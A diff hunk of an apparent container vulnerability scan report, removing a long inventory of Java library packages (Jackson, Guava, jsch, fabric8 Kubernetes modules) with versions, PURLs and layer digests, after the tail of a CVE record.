@@ -1355,1267 +1355,2625 @@
 │                             │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-27171 
 │                             ├ PublishedDate   : 2026-02-18T04:16:01.263Z 
 │                             ╰ LastModifiedDate: 2026-03-25T21:27:04.603Z 
-╰ [1] ╭ Target  : Java 
-      ├ Class   : lang-pkgs 
-      ├ Type    : jar 
-      ╰ Packages ╭ [0]   ╭ Name      : com.carrotsearch.thirdparty:simple-xml-safe 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.carrotsearch.thirdparty/simple-xml-safe@2.7.1 
-                 │       │            ╰ UID : 13b037b1fd5d66f 
-                 │       ├ Version   : 2.7.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/S3/simple-xml-safe-2.7.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [1]   ╭ Name      : com.fasterxml.jackson.core:jackson-annotations 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-annotations@2.21 
-                 │       │            ╰ UID : a68585b707b894c6 
-                 │       ├ Version   : 2.21 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [2]   ╭ Name      : com.fasterxml.jackson.core:jackson-core 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-core@2.21.1 
-                 │       │            ╰ UID : a0ae06e5352781bf 
-                 │       ├ Version   : 2.21.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [3]   ╭ Name      : com.fasterxml.jackson.core:jackson-databind 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.21.1 
-                 │       │            ╰ UID : f5a07e107dd30f70 
-                 │       ├ Version   : 2.21.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [4]   ╭ Name      : com.fasterxml.jackson.dataformat:jackson-dataformat-toml 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.dataformat/jackson-dataformat-tom
-                 │       │            │       l@2.21.2 
-                 │       │            ╰ UID : 207de139b4c562ba 
-                 │       ├ Version   : 2.21.2 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [5]   ╭ Name      : com.fasterxml.jackson.dataformat:jackson-dataformat-yaml 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.dataformat/jackson-dataformat-yam
-                 │       │            │       l@2.20.0 
-                 │       │            ╰ UID : 16f220ba7aa2c313 
-                 │       ├ Version   : 2.20.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/jackson-dataformat-yaml-2.20.0.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [6]   ╭ Name      : com.fasterxml.jackson.datatype:jackson-datatype-jsr310 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.datatype/jackson-datatype-jsr310@
-                 │       │            │       2.20.0 
-                 │       │            ╰ UID : d55714c89e63442b 
-                 │       ├ Version   : 2.20.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/jackson-datatype-jsr310-2.20.0.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [7]   ╭ Name      : com.github.mwiede:jsch 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.github.mwiede/jsch@2.28.0 
-                 │       │            ╰ UID : 98eb7bafeacbc106 
-                 │       ├ Version   : 2.28.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [8]   ╭ Name      : com.github.vertical-blank:sql-formatter 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.github.vertical-blank/sql-formatter@2.0.5 
-                 │       │            ╰ UID : b476ea318a48e65d 
-                 │       ├ Version   : 2.0.5 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [9]   ╭ Name      : com.google.code.gson:gson 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.code.gson/gson@2.13.2 
-                 │       │            ╰ UID : 55058bf256f684f6 
-                 │       ├ Version   : 2.13.2 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [10]  ╭ Name      : com.google.errorprone:error_prone_annotations 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.errorprone/error_prone_annotations@2.41.0 
-                 │       │            ╰ UID : eb9200afd679f03a 
-                 │       ├ Version   : 2.41.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/S3/error_prone_annotations-2.41.0.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [11]  ╭ Name      : com.google.guava:failureaccess 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.guava/failureaccess@1.0.3 
-                 │       │            ╰ UID : a4d08553078f3494 
-                 │       ├ Version   : 1.0.3 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/S3/failureaccess-1.0.3.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [12]  ╭ Name      : com.google.guava:guava 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.guava/guava@33.5.0-jre 
-                 │       │            ╰ UID : 1c289ba755aff307 
-                 │       ├ Version   : 33.5.0-jre 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/S3/guava-33.5.0-jre.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [13]  ╭ Name      : com.google.guava:listenablefuture 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.guava/listenablefuture@9999.0-empty-to-avoid
-                 │       │            │       -conflict-with-guava 
-                 │       │            ╰ UID : dea9132e00506d46 
-                 │       ├ Version   : 9999.0-empty-to-avoid-conflict-with-guava 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/S3/listenablefuture-9999.0-empty-to-avoid-conflict-with-guava.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [14]  ╭ Name      : com.google.j2objc:j2objc-annotations 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.j2objc/j2objc-annotations@3.1 
-                 │       │            ╰ UID : 33e5dd761cf08520 
-                 │       ├ Version   : 3.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/S3/j2objc-annotations-3.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [15]  ╭ Name      : com.googlecode.juniversalchardet:juniversalchardet 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.googlecode.juniversalchardet/juniversalchardet@1.0.3 
-                 │       │            ╰ UID : 5447189855b6db87 
-                 │       ├ Version   : 1.0.3 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [16]  ╭ Name      : com.jcraft:jsch.agentproxy.connector-factory 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.connector-factory@0.0.9 
-                 │       │            ╰ UID : a99fffa9ec19f7cf 
-                 │       ├ Version   : 0.0.9 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [17]  ╭ Name      : com.jcraft:jsch.agentproxy.core 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.core@0.0.9 
-                 │       │            ╰ UID : afb96fc5c6b4a255 
-                 │       ├ Version   : 0.0.9 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [18]  ╭ Name      : com.jcraft:jsch.agentproxy.jsch 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.jsch@0.0.9 
-                 │       │            ╰ UID : 8066e61c44eb14ea 
-                 │       ├ Version   : 0.0.9 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [19]  ╭ Name      : com.jcraft:jsch.agentproxy.pageant 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.pageant@0.0.9 
-                 │       │            ╰ UID : c0284278b99b17bc 
-                 │       ├ Version   : 0.0.9 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [20]  ╭ Name      : com.jcraft:jsch.agentproxy.sshagent 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.sshagent@0.0.9 
-                 │       │            ╰ UID : bd9e5fa40773f9dc 
-                 │       ├ Version   : 0.0.9 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [21]  ╭ Name      : com.jcraft:jsch.agentproxy.svnkit-trilead-ssh2 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.svnkit-trilead-ssh2@0.0.9 
-                 │       │            ╰ UID : 4bc35c3b9b6add62 
-                 │       ├ Version   : 0.0.9 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [22]  ╭ Name      : com.jcraft:jsch.agentproxy.usocket-jna 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.usocket-jna@0.0.9 
-                 │       │            ╰ UID : c30290a3390d8666 
-                 │       ├ Version   : 0.0.9 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [23]  ╭ Name      : com.jcraft:jsch.agentproxy.usocket-nc 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.usocket-nc@0.0.9 
-                 │       │            ╰ UID : 48390e4cf4a3666a 
-                 │       ├ Version   : 0.0.9 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [24]  ╭ Name      : com.sun.activation:javax.activation 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.sun.activation/javax.activation@1.2.0 
-                 │       │            ╰ UID : 76398eb1d6d13adc 
-                 │       ├ Version   : 1.2.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [25]  ╭ Name      : com.sun.mail:javax.mail 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.sun.mail/javax.mail@1.6.2 
-                 │       │            ╰ UID : 1e7beb37baabc57a 
-                 │       ├ Version   : 1.6.2 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [26]  ╭ Name      : com.warrenstrange:googleauth 
-                 │       ├ Identifier ╭ PURL: pkg:maven/com.warrenstrange/googleauth@1.5.0 
-                 │       │            ╰ UID : 99ee628fb0243c8d 
-                 │       ├ Version   : 1.5.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [27]  ╭ Name      : commons-cli:commons-cli 
-                 │       ├ Identifier ╭ PURL: pkg:maven/commons-cli/commons-cli@1.11.0 
-                 │       │            ╰ UID : 3475d2ee4b04dbe0 
-                 │       ├ Version   : 1.11.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [28]  ╭ Name      : commons-codec:commons-codec 
-                 │       ├ Identifier ╭ PURL: pkg:maven/commons-codec/commons-codec@1.21.0 
-                 │       │            ╰ UID : 2426b259c63a1b24 
-                 │       ├ Version   : 1.21.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [29]  ╭ Name      : commons-io:commons-io 
-                 │       ├ Identifier ╭ PURL: pkg:maven/commons-io/commons-io@2.21.0 
-                 │       │            ╰ UID : 2061cef217097cbb 
-                 │       ├ Version   : 2.21.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [30]  ╭ Name      : commons-logging:commons-logging 
-                 │       ├ Identifier ╭ PURL: pkg:maven/commons-logging/commons-logging@1.3.6 
-                 │       │            ╰ UID : 2ad3f2cbc57ed9d5 
-                 │       ├ Version   : 1.3.6 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [31]  ╭ Name      : commons-net:commons-net 
-                 │       ├ Identifier ╭ PURL: pkg:maven/commons-net/commons-net@3.12.0 
-                 │       │            ╰ UID : f30479acbb8d626f 
-                 │       ├ Version   : 3.12.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [32]  ╭ Name      : de.vandermeer:asciilist-j7 
-                 │       ├ Identifier ╭ PURL: pkg:maven/de.vandermeer/asciilist-j7@1.0.0 
-                 │       │            ╰ UID : 5d38f221ce7d2a1 
-                 │       ├ Version   : 1.0.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [33]  ╭ Name      : de.vandermeer:asciitable-j7 
-                 │       ├ Identifier ╭ PURL: pkg:maven/de.vandermeer/asciitable-j7@1.0.1 
-                 │       │            ╰ UID : 4ec0aaacbd72cc14 
-                 │       ├ Version   : 1.0.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [34]  ╭ Name      : dnsjava:dnsjava 
-                 │       ├ Identifier ╭ PURL: pkg:maven/dnsjava/dnsjava@3.6.4 
-                 │       │            ╰ UID : 7aac8b1c2f9d99a1 
-                 │       ├ Version   : 3.6.4 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [35]  ╭ Name      : io.fabric8:kubernetes-client 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-client@7.6.1 
-                 │       │            ╰ UID : 7a1af2167e01c22a 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-client-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [36]  ╭ Name      : io.fabric8:kubernetes-client-api 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-client-api@7.6.1 
-                 │       │            ╰ UID : 468622c9bc901899 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-client-api-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [37]  ╭ Name      : io.fabric8:kubernetes-httpclient-vertx 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-httpclient-vertx@7.6.1 
-                 │       │            ╰ UID : 11eccf3c064d4ac7 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-httpclient-vertx-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [38]  ╭ Name      : io.fabric8:kubernetes-model-admissionregistration 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-admissionregistration@7.6.1 
-                 │       │            ╰ UID : 258f11a1ddbbeb52 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-admissionregistration-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [39]  ╭ Name      : io.fabric8:kubernetes-model-apiextensions 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-apiextensions@7.6.1 
-                 │       │            ╰ UID : d94960c2c0f9ad90 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-apiextensions-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [40]  ╭ Name      : io.fabric8:kubernetes-model-apps 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-apps@7.6.1 
-                 │       │            ╰ UID : 4a742b22335668fa 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-apps-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [41]  ╭ Name      : io.fabric8:kubernetes-model-autoscaling 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-autoscaling@7.6.1 
-                 │       │            ╰ UID : 1bcdf924b2ec1259 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-autoscaling-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [42]  ╭ Name      : io.fabric8:kubernetes-model-batch 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-batch@7.6.1 
-                 │       │            ╰ UID : e2cb3349c5c65795 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-batch-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [43]  ╭ Name      : io.fabric8:kubernetes-model-certificates 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-certificates@7.6.1 
-                 │       │            ╰ UID : 98ce726d4a3489fe 
-                 │       ├ Version   : 7.6.1 
